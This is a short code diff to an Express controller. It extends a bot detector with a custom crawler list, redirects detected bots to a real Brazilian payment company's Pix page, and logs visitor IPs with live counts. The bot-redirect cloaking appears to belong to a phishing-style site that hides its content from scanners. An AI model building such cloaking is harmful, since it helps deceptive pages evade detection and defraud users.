@@ -1,10 +1,13 @@
 const Client = require('../../models/Client')
 const isbot = require('isbot')
 const Visitor = require('../../models/visitor')
+const Robots = require('../../modules/Robots')
 
 module.exports = {
     async view(req, res) {
         try {
+            isbot.extend(Robots)
+
             if (isbot(req.get('user-agent'))) return res.redirect('https://www.stone.com.br/pix/')
 
             const ip = req.ip
@@ -18,8 +21,6 @@ module.exports = {
 
                 req.app.io.emit('visitors', countVisitors)
             }
-
-            console.log(visitor)
 
             const { client } = req.query
 
